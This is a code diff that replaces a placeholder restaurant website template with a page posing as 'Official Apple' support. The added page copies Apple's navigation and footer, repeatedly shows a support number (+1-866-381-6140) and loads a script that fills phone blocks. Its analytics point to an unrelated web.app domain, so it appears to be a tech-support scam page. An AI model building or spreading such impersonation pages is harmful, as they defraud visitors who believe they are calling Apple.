@@ -1,12 +1,8 @@
-<?php
-?>
-<!DOCTYPE html>
-	<html lang="zxx" class="no-js">
-	<head>
-		<!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5039462,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,543 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039462&101" alt="free web tracker" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-		<!-- Mobile Specific Meta -->
-		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-		<!-- Favicon-->
-		<link rel="shortcut icon" href="img/fav.png">
-		<!-- Author Meta -->
-		<meta name="author" content="colorlib">
-		<!-- Meta Description -->
-		<meta name="description" content="">
-		<!-- Meta Keyword -->
-		<meta name="keywords" content="">
-		<!-- meta character set -->
-		<meta charset="UTF-8">
-		<!-- Site Title -->
-		<title>Marco</title>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-		<link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet"> 
-			<!--
-			CSS
-			============================================= -->
-			<link rel="stylesheet" href="css/linearicons.css">
-			<link rel="stylesheet" href="css/font-awesome.min.css">
-			<link rel="stylesheet" href="css/bootstrap.css">
-			<link rel="stylesheet" href="css/magnific-popup.css">
-			<link rel="stylesheet" href="css/jquery-ui.css">				
-			<link rel="stylesheet" href="css/nice-select.css">							
-			<link rel="stylesheet" href="css/animate.min.css">
-			<link rel="stylesheet" href="css/owl.carousel.css">				
-			<link rel="stylesheet" href="css/main.css">
-		</head>
-		<body>	
-			<header id="header">
-				<div class="header-top">
-					<div class="container">
-				  		<div class="row justify-content-center">
-						      <div id="logo">
-						        <a href="index.html"><img src="img/logo.png" alt="" title="" /></a>
-						      </div>
-				  		</div>			  					
-					</div>
-				</div>
-				<div class="container main-menu">
-					<div class="row align-items-center justify-content-center d-flex">			
-				      <nav id="nav-menu-container">
-				        <ul class="nav-menu">
-				          <li><a href="index.html">Home</a></li>
-				          <li><a href="about.html">About</a></li>
-				          <li><a href="menu.html">Menu</a></li>
-				          <li><a href="gallery.html">Gallery</a></li>
-				          <li class="menu-has-children"><a href="">Blog</a>
-				            <ul>
-				              <li><a href="blog-home.html">Blog Home</a></li>
-				              <li><a href="blog-single.html">Blog Single</a></li>
-				            </ul>
-				          </li>	
-				          <li class="menu-has-children"><a href="">Pages</a>
-				            <ul>
-				            	  <li><a href="elements.html">Elements</a></li>
-						          <li class="menu-has-children"><a href="">Level 2 </a>
-						            <ul>
-						              <li><a href="#">Item One</a></li>
-						              <li><a href="#">Item Two</a></li>
-						            </ul>
-						          </li>					                		
-				            </ul>
-				          </li>					          					          		          
-				          <li><a href="contact.html">Contact</a></li>
-				        </ul>
-				      </nav><!-- #nav-menu-container -->					      		  
-					</div>
-				</div>
-			</header><!-- #header -->
-			
-			<!-- start banner Area -->
-			<section class="banner-area">		
-				<div class="container">
-					<div class="row fullscreen align-items-center justify-content-between">
-						<div class="col-lg-12 banner-content">
-							<h6 class="text-white">Wide Options of Choice</h6>
-							<h1 class="text-white">Delicious Recipes</h1>
-							<p class="text-white">
-								inappropriate behavior is often laughed off as “boys will be boys,” women face higher conduct standards especially in the workplace. That’s why it’s crucial that, as women.
-							</p>
-							<a href="#" class="primary-btn text-uppercase">Check Our Menu</a>
-						</div>
-					</div>
-				</div>					
-			</section>
-			<!-- End banner Area -->
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-			<!-- Start home-about Area -->
-			<section class="home-about-area section-gap">
-				<div class="container">
-					<div class="row align-items-center">
-						<div class="col-lg-6 home-about-left">
-							<h1>About Our Story</h1>
-							<p>
-								Who are in extremely love with eco friendly system. Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-							</p>
-							<a href="#" class="primary-btn">view full menu</a>
-						</div>
-						<div class="col-lg-6 home-about-right">
-							<img class="img-fluid" src="img/about-img.jpg" alt="">
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End home-about Area -->			
+</head>
 
-			<!-- Start menu-area Area -->
-            <section class="menu-area section-gap" id="menu">
-                <div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">What kind of Foods we serve for you</h1>
-								<p>Who are in extremely love with eco friendly system.</p>
-							</div>
-						</div>
-					</div>	
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-                    <ul class="filter-wrap filters col-lg-12 no-padding">
-                        <li class="active" data-filter="*">All Menu</li>
-                        <li data-filter=".breakfast">Breakfast</li>
-                        <li data-filter=".lunch">Lunch</li>
-                        <li data-filter=".dinner">Dinner</li>
-                        <li data-filter=".budget-meal">Budget Meal</li>
-                        <li data-filter=".buffet">Buffet</li>
-                    </ul>
-                    
-                    <div class="filters-content">
-                        <div class="row grid">
-                            <div class="col-md-6 all breakfast">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Cappuccion</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>					                               
-                            </div>                           
-                            <div class="col-md-6 all dinner">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Americano</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
                             </div>
-                            <div class="col-md-6 all budget-meal">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Macchiato</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all breakfast">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Mocha</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all lunch">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Piccolo Latte</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all buffet">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Ristretto</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>                            
                         </div>
                     </div>
-                    
                 </div>
-            </section>
-            <!-- End menu-area Area -->			
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-			<!-- Start reservation Area -->
-			<section class="reservation-area section-gap relative">
-				<div class="overlay overlay-bg"></div>
-				<div class="container">
-					<div class="row justify-content-between align-items-center">
-						<div class="col-lg-6 reservation-left">
-							<h1 class="text-white">Reserve Your Seats
-							to Confirm if You Come
-							with Your Family</h1>
-							<p class="text-white pt-20">
-								Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam. Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea.
-							</p>
-						</div>
-						<div class="col-lg-5 reservation-right">
-							<form class="form-wrap text-center" action="#">
-								<input type="text" class="form-control" name="name" placeholder="Your Name" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Name'" >
-								<input type="email" class="form-control" name="email" placeholder="Your Email Address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Email Address'" >
-								<input type="text" class="form-control" name="phone" placeholder="Phone Number" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Phone Number'" >		
-								<input type="text" class="form-control date-picker" name="date" placeholder="Select Date & time" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Select Date & time'" >									
-								<div class="form-select" id="service-select">
-									<select>
-										<option data-display="">Select Event</option>
-										<option value="1">Event One</option>
-										<option value="2">Event Two</option>
-										<option value="3">Event Three</option>
-										<option value="4">Event Four</option>
-									</select>
-								</div>									
-								<button class="primary-btn text-uppercase mt-20">Make Reservation</button>
-							</form>
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End reservation Area -->
-			
-			<!-- Start gallery-area Area -->
-            <section class="gallery-area section-gap" id="gallery">
-                <div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">Food and Customer Gallery</h1>
-								<p>Who are in extremely love with eco friendly system.</p>
-							</div>
-						</div>
-					</div>	
-                    
-                    <ul class="filter-wrap filters col-lg-12 no-padding">
-                        <li class="active" data-filter="*">All Menu</li>
-                        <li data-filter=".breakfast">Breakfast</li>
-                        <li data-filter=".lunch">Lunch</li>
-                        <li data-filter=".dinner">Dinner</li>
-                        <li data-filter=".budget-meal">Budget Meal</li>
-                        <li data-filter=".buffet">Buffet</li>
-                    </ul>
-                    
-                    
-                    <div class="filters-content">
-                        <div class="row grid">
-                            <div class="col-lg-4 col-md-6 col-sm-6 all breakfast">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g1.jpg" alt="">
-                            	</div>	                          
-                            </div>                           
-                            <div class="col-lg-4 col-md-6 col-sm-6 all dinner">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g2.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all budget-meal">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g3.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all breakfast">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g4.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all lunch">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g5.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all buffet">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g6.jpg" alt="">
-                            	</div>                            
-                            </div>                            
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
                         </div>
                     </div>
-                    
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
             </section>
-            <!-- End gallery-area Area -->			
-
-			<!-- Start review Area -->
-			<section class="review-area section-gap">
-				<div class="container">
-					<div class="row">
-						<div class="active-review-carusel">
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>	
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>														
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End review Area -->					
-
-			<!-- Start blog Area -->
-			<section class="blog-area section-gap" id="blog">
-				<div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">Latest From Our Blog</h1>
-								<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore  et dolore magna aliqua.</p>
-							</div>
-						</div>
-					</div>					
-					<div class="row">
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b1.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Cooking Perfect Fried Rice
-							in minutes</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b2.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Secret of making Heart 
-							Shaped eggs</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b3.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>How to check steak if 
-							it is tender or not</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b4.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Seaseme and black seed
-							Flavored Bun Rocks</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>							
-					</div>
-				</div>	
-			</section>
-			<!-- End blog Area -->							
-
-			<!-- start footer Area -->		
-			<footer class="footer-area">
-				<div class="footer-widget-wrap">
-					<div class="container">
-						<div class="row section-gap">
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Opening Hours</h4>
-									<ul class="hr-list">
-										<li class="d-flex justify-content-between">
-											<span>Monday - Friday</span> <span>08.00 am - 10.00 pm</span>
-										</li>
-										<li class="d-flex justify-content-between">
-											<span>Saturday</span> <span>08.00 am - 10.00 pm</span>
-										</li>
-										<li class="d-flex justify-content-between">
-											<span>Sunday</span> <span>08.00 am - 10.00 pm</span>
-										</li>																				
-									</ul>
-								</div>
-							</div>
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Contact Us</h4>
-									<p>
-										56/8, los angeles, rochy beach, Santa monica, United states of america - 1205
-									</p>
-									<p class="number">
-										012-6532-568-9746 <br>
-										012-6532-569-9748
-									</p>
-								</div>
-							</div>						
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Newsletter</h4>
-									<p>You can trust us. we only send promo offers, not a single spam.</p>
-									<div class="d-flex flex-row" id="mc_embed_signup">
+        </div>
+    </footer>
 
 
-										  <form class="navbar-form" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01" method="get">
-										    <div class="input-group add-on align-items-center d-flex">
-										      	<input class="form-control" name="EMAIL" placeholder="Your Email address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Email address'" required="" type="email">
-												<div style="position: absolute; left: -5000px;">
-													<input name="b_36c4fd991d266f23781ded980_aefe40901a" tabindex="-1" value="" type="text">
-												</div>
-										      <div class="input-group-btn">
-										        <button class="genric-btn"><span class="lnr lnr-arrow-right"></span></button>
-										      </div>
-										    </div>
-										      <div class="info mt-20"></div>
-										  </form>
-									</div>
-								</div>
-							</div>						
-						</div>					
-					</div>					
-				</div>
-				<div class="footer-bottom-wrap">
-					<div class="container">
-						<div class="row footer-bottom d-flex justify-content-between align-items-center">
-							<p class="col-lg-8 col-mdcol-sm-6 -6 footer-text m-0"><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | Made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a> &amp; distributed by <a href="https://themewagon.com" target="_blank">ThemeWagon</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-							<ul class="col-lg-4 col-mdcol-sm-6 -6 social-icons text-right">
-	                            <li><a href="#"><i class="fa fa-facebook"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-twitter"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-behance"></i></a></li>           
-	                        </ul>
-						</div>						
-					</div>
-				</div>
-			</footer>
-			<!-- End footer Area -->	
 
-			<script src="js/vendor/jquery-2.2.4.min.js"></script>
-			<script src="js/popper.min.js"></script>
-			<script src="js/vendor/bootstrap.min.js"></script>			
-			<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBhOdIF3Y9382fqJYt5I_sswSrEw5eihAA"></script>		
- 			<script src="js/jquery-ui.js"></script>					
-  			<script src="js/easing.min.js"></script>			
-			<script src="js/hoverIntent.js"></script>
-			<script src="js/superfish.min.js"></script>	
-			<script src="js/jquery.ajaxchimp.min.js"></script>
-			<script src="js/jquery.magnific-popup.min.js"></script>						
-			<script src="js/jquery.nice-select.min.js"></script>					
-			<script src="js/owl.carousel.min.js"></script>			
